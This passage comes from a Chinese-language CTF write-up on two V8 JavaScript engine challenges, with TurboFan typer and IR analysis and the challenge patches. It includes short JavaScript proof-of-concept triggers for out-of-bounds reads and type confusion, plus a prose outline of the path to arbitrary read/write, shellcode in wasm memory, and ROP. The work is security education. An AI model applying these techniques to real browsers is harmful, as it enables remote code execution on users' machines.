+<p>由于left_type即index的type信息被分析为(4,4)，right_type即array length的type信息被分析为（4,4)<br>满足<code>else if (left_type.Min() &gt;= right_type.Max())</code><br>所以kNumberLessThan的类型会被更新成false，然后在ConstantFoldingReducer时候<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Reduction ConstantFoldingReducer::Reduce(Node* node) &#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line">  <span class="comment">// Check if the output type is a singleton.  In that case we already know the</span></span><br><span class="line">  <span class="comment">// result value and can simply replace the node if it's eliminable.</span></span><br><span class="line">  <span class="keyword">if</span> (!NodeProperties::IsConstant(node) &amp;&amp; NodeProperties::IsTyped(node) &amp;&amp;</span><br><span class="line">      node-&gt;op()-&gt;HasProperty(Operator::kEliminatable)) &#123;</span><br><span class="line">    <span class="comment">// TODO(v8:5303): We must not eliminate FinishRegion here. This special</span></span><br><span class="line">    <span class="comment">// case can be removed once we have separate operators for value and</span></span><br><span class="line">    <span class="comment">// effect regions.</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;opcode() == IrOpcode::kFinishRegion) <span class="keyword">return</span> NoChange();</span><br><span class="line">    <span class="comment">// We can only constant-fold nodes here, that are known to not cause any</span></span><br><span class="line">    <span class="comment">// side-effect, may it be a JavaScript observable side-effect or a possible</span></span><br><span class="line">    <span class="comment">// eager deoptimization exit (i.e. &#123;node&#125; has an operator that doesn't have</span></span><br><span class="line">    <span class="comment">// the Operator::kNoDeopt property).</span></span><br><span class="line">    Type upper = NodeProperties::GetType(node);</span><br><span class="line">    <span class="keyword">if</span> (!upper.IsNone()) &#123;</span><br><span class="line">      Node* replacement = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (upper.IsHeapConstant()) &#123;</span><br><span class="line">        replacement = jsgraph()-&gt;Constant(upper.AsHeapConstant()-&gt;Ref());</span><br></pre></td></tr></table></figure></p>
+<p>被直接折叠成了false节点。<br>最后只剩下了对Smi::kMaxValue的CheckBounds。<br>然而这对我们来说毫无意义。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-115435.png" alt=""><br>所以我们的第一步就是构造PoC，bypass掉ConstantFoldingReducer，这一步其实非常简单，只要让NumberLessThan在TyperNarrowingReducer的时候，不被类型更新成false就可以了。</p>
+<h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-121438.png" alt=""><br>idx的range取决于20和16号节点，如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#21:SpeculativeNumberBitwiseAnd[SignedSmall](#16:NumberConstant, #20:NumberConstant, #17:Checkpoint, #12:JSStackCheck)  [Type: Range(0, 4)]</span><br><span class="line">#20:NumberConstant[65535]()  [Type: Range(65535, 65535)]</span><br><span class="line">#16:NumberConstant[4]()  [Type: Range(4, 4)]</span><br></pre></td></tr></table></figure></p>
+<p>经过以下的typer分析得到range为(0,4)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">SPECULATIVE_NUMBER_BINOP(NumberBitwiseAnd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECULATIVE_NUMBER_BINOP(Name)                         \</span></span><br><span class="line">  Type OperationTyper::Speculative##Name(Type lhs, Type rhs) &#123; \</span><br><span class="line">    lhs = SpeculativeToNumber(lhs);                            \</span><br><span class="line">    rhs = SpeculativeToNumber(rhs);                            \</span><br><span class="line">    <span class="keyword">return</span> Name(lhs, rhs);                                     \</span><br><span class="line">  &#125;</span><br><span class="line">---&gt;</span><br><span class="line">Type OperationTyper::NumberBitwiseAnd(Type lhs, Type rhs) &#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToInt32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> lmin = lhs.Min();</span><br><span class="line">  <span class="keyword">double</span> rmin = rhs.Min();</span><br><span class="line">  <span class="keyword">double</span> lmax = lhs.Max();</span><br><span class="line">  <span class="keyword">double</span> rmax = rhs.Max();</span><br><span class="line">  <span class="keyword">double</span> min = kMinInt;</span><br><span class="line">  <span class="comment">// And-ing any two values results in a value no larger than their maximum.</span></span><br><span class="line">  <span class="comment">// Even no larger than their minimum if both values are non-negative.</span></span><br><span class="line">  <span class="keyword">double</span> max =</span><br><span class="line">      lmin &gt;= <span class="number">0</span> &amp;&amp; rmin &gt;= <span class="number">0</span> ? <span class="built_in">std</span>::min(lmax, rmax) : <span class="built_in">std</span>::max(lmax, rmax);</span><br><span class="line">  <span class="comment">// And-ing with a non-negative value x causes the result to be between</span></span><br><span class="line">  <span class="comment">// zero and x.</span></span><br><span class="line">  <span class="keyword">if</span> (lmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    min = <span class="number">0</span>;</span><br><span class="line">    max = <span class="built_in">std</span>::min(max, lmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (rmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    min = <span class="number">0</span>;</span><br><span class="line">    max = <span class="built_in">std</span>::min(max, rmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Range(min, max, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后checkbounds的range也被分析成(0,4)<br>即取index和length的range的交集。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Type OperationTyper::CheckBounds(Type index, Type length) &#123;</span><br><span class="line">  DCHECK(length.Is(cache_-&gt;kPositiveSafeInteger));</span><br><span class="line">  <span class="keyword">if</span> (length.Is(cache_-&gt;kSingletonZero)) <span class="keyword">return</span> Type::None();</span><br><span class="line">  Type mask = Type::Range(<span class="number">0.0</span>, length.Max() - <span class="number">1</span>, zone());</span><br><span class="line">  <span class="keyword">if</span> (index.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">    index = Type::Union(index, cache_-&gt;kSingletonZero, zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Intersect(index, mask, zone());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">#<span class="number">35</span>:CheckBounds[VectorSlotPair(INVALID)](#<span class="number">21</span>:SpeculativeNumberBitwiseAnd, #<span class="number">34</span>:NumberConstant, #<span class="number">33</span>:LoadField, #<span class="number">12</span>:JSStackCheck)  [Type: Range(<span class="number">0</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure></p>
+<p>于是NumberLessThan的left_type即CheckBounds(实际上当成index也可以理解)的范围不再是(4,4)，而是被分析成了(0,4)<br>不再满足<code>left_type.Min() &gt;= right_type.Max())</code><br>也就不会被折叠了。<br>于是最终的PoC就可以给出<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(main());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了越界读写一个element的原语,接下来就是构建完整的漏洞利用。<br>思路是：<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>详细的思路参考我写的<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a> exp。</p>
+<h2 id="wctf-independence-day"><a href="#wctf-independence-day" class="headerlink" title="wctf independence_day"></a>wctf independence_day</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/objects/code.cc b/src/objects/code.cc</span><br><span class="line">index <span class="number">24817</span>ca65c.<span class="number">.4079</span>f6077d <span class="number">100644</span></span><br><span class="line">--- a/src/objects/code.cc</span><br><span class="line">+++ b/src/objects/code.cc</span><br><span class="line">@@ <span class="number">-925</span>,<span class="number">6</span> +<span class="number">925</span>,<span class="number">7</span> @@ <span class="keyword">void</span> DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">                                       <span class="keyword">const</span> MaybeObjectHandle&amp; code,</span><br><span class="line">                                       Handle&lt;HeapObject&gt; object,</span><br><span class="line">                                       DependencyGroup group) &#123;</span><br><span class="line">+<span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">   Handle&lt;DependentCode&gt; old_deps(DependentCode::GetDependentCode(object),</span><br><span class="line">                                  isolate);</span><br><span class="line">   Handle&lt;DependentCode&gt; new_deps =</span><br><span class="line">@@ <span class="number">-932</span>,<span class="number">6</span> +<span class="number">933</span>,<span class="number">7</span> @@ <span class="keyword">void</span> DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">   <span class="comment">// Update the list head if necessary.</span></span><br><span class="line">   <span class="keyword">if</span> (!new_deps.is_identical_to(old_deps))</span><br><span class="line">     DependentCode::SetDependentCode(object, new_deps);</span><br><span class="line">+#endif</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> Handle&lt;DependentCode&gt; DependentCode::InsertWeakCode(</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">commit <span class="number">3794e5</span>f0eeee3d421cc0d2a8d8b84ac82d37f10d</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Sat Dec <span class="number">15</span> <span class="number">18</span>:<span class="number">21</span>:<span class="number">08</span> <span class="number">2018</span> +<span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    strip global in realms</span><br><span class="line"></span><br><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index <span class="number">98b</span>c56ad25..e72f528ae5 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-1043</span>,<span class="number">9</span> +<span class="number">1043</span>,<span class="number">8</span> @@ MaybeLocal&lt;Context&gt; Shell::CreateRealm(</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">delete</span>[] old_realms;</span><br><span class="line">   &#125;</span><br><span class="line">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span><br><span class="line">   Local&lt;Context&gt; context =</span><br><span class="line">-      Context::New(isolate, <span class="literal">nullptr</span>, global_template, global_object);</span><br><span class="line">+      Context::New(isolate, <span class="literal">nullptr</span>, ObjectTemplate::New(isolate), v8::MaybeLocal&lt;Value&gt;());</span><br><span class="line">   DCHECK(!try_catch.HasCaught());</span><br><span class="line">   <span class="keyword">if</span> (context.IsEmpty()) <span class="keyword">return</span> MaybeLocal&lt;Context&gt;();</span><br><span class="line">   InitializeModuleEmbedderData(context);</span><br></pre></td></tr></table></figure>
+<p>题目给了两个patch，第一个patch是禁用了code dependencies，第二个patch应该是禁用了wasm这种利用方法。<br>要理解这个patch，就要知道v8中不止有<br>实际上注册对arr的type的dependencies的地方在ReduceElementAccess的BuildCheckMaps中，换句话说，如果我们要check的map是stableMap，就直接注册一个 compilation dependencies的回调到map中。<br>如果不是，就插入一个checkMap节点到effect chain中。<br>可以学习一下<a href="https://ssd-disclosure.com/archives/3379" target="_blank" rel="noopener">这个漏洞</a>，很有趣。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Reduction JSNativeContextSpecialization::ReduceElementAccess(</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// Perform map check on the &#123;receiver&#125;.</span></span><br><span class="line">    access_builder.BuildCheckMaps(receiver, &amp;effect, control,</span><br><span class="line">                                  access_info.receiver_maps());</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> PropertyAccessBuilder::BuildCheckMaps(</span><br><span class="line">    Node* receiver, Node** effect, Node* control,</span><br><span class="line">    ZoneVector&lt;Handle&lt;Map&gt;&gt; <span class="keyword">const</span>&amp; receiver_maps) &#123;</span><br><span class="line">  HeapObjectMatcher m(receiver);</span><br><span class="line">  <span class="keyword">if</span> (m.HasValue()) &#123;</span><br><span class="line">    MapRef receiver_map = m.Ref(broker()).<span class="built_in">map</span>();</span><br><span class="line">    <span class="keyword">if</span> (receiver_map.is_stable()) &#123;</span><br><span class="line">      <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (MapRef(broker(), <span class="built_in">map</span>).equals(receiver_map)) &#123;</span><br><span class="line">          dependencies()-&gt;DependOnStableMap(receiver_map);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ZoneHandleSet&lt;Map&gt; maps;</span><br><span class="line">  CheckMapsFlags flags = CheckMapsFlag::kNone;</span><br><span class="line">  <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span><br><span class="line">    MapRef receiver_map(broker(), <span class="built_in">map</span>);</span><br><span class="line">    maps.insert(receiver_map.object(), graph()-&gt;zone());</span><br><span class="line">    <span class="keyword">if</span> (receiver_map.is_migration_target()) &#123;</span><br><span class="line">      flags |= CheckMapsFlag::kTryMigrateInstance;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *effect = graph()-&gt;NewNode(simplified()-&gt;CheckMaps(flags, maps), receiver,</span><br><span class="line">                             *effect, control);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>而这个patch就是把install compile dependency的代码给禁用了，所以如果我们使用一个stable map的arr，将不会有任何的类型检查，于是就有了一个type confusion。</p>
+<h3 id="IR分析-1"><a href="#IR分析-1" class="headerlink" title="IR分析"></a>IR分析</h3><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p>非stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072849.jpg" alt=""></p>
+<h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><p>stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072916.jpg" alt=""></p>
+<p>所以给出poc如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// make the map stable</span></span><br><span class="line">arr.x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// optimize foo</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">    foo(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// change arr to dictionary map</span></span><br><span class="line">arr[<span class="number">0x100000</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">1000</span>));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>stephen给出了一种非常精巧的漏洞利用方法，而不是使用wasm rwx内存，实际上这个迟早要被禁用。<br>通过poc我们很容易就可以得到任意地址读写的原语。<br>为了构建rop链，我们可以使用如下的方法，来自stephen，非常感谢。</p>
+<ol>
+<li>leak a binary pointer from the heap</li>
+<li>read pointer to kernel32 from IAT</li>
+<li>read kernelbase pointer from IAT of kernel32</li>
+<li>There’s a stack pointer stored in a struct at KERNELBASE!BasepCurrentTopLevelFilter+8</li>
+<li>ROP</li>
+</ol>
+<p>另外如果challenge只给了v8 binary，而是给了一个chromium的话，也可以参考我博客上关于bug-906043的漏洞利用。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/29/v9/" rel="next" title="34c3 v9 writeup">
+                <i class="fa fa-chevron-left"></i> 34c3 v9 writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/09/18/study/" rel="prev" title="Sakuraのdiary">
+                Sakuraのdiary <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/sakura_heart.png"
+                alt="sakura" />
+            
+              <p class="site-author-name" itemprop="name">sakura</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dwfault-blog.imwork.net:30916/" title="dwfalut" target="_blank">dwfalut</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.auxy.xyz" title="Auxy" target="_blank">Auxy</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#qwb-growupjs-amp-wctf-independence-day-writeup"><span class="nav-number">1.</span> <span class="nav-text">qwb growupjs &amp; wctf independence_day writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#qwb-growupjs"><span class="nav-number">1.1.</span> <span class="nav-text">qwb growupjs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IR分析"><span class="nav-number">1.1.2.</span> <span class="nav-text">IR分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#case-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">case 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#case-2"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">case 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#case3"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">case3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wctf-independence-day"><span class="nav-number">1.2.</span> <span class="nav-text">wctf independence_day</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IR分析-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">IR分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#case1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">case1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#case2"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">case2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
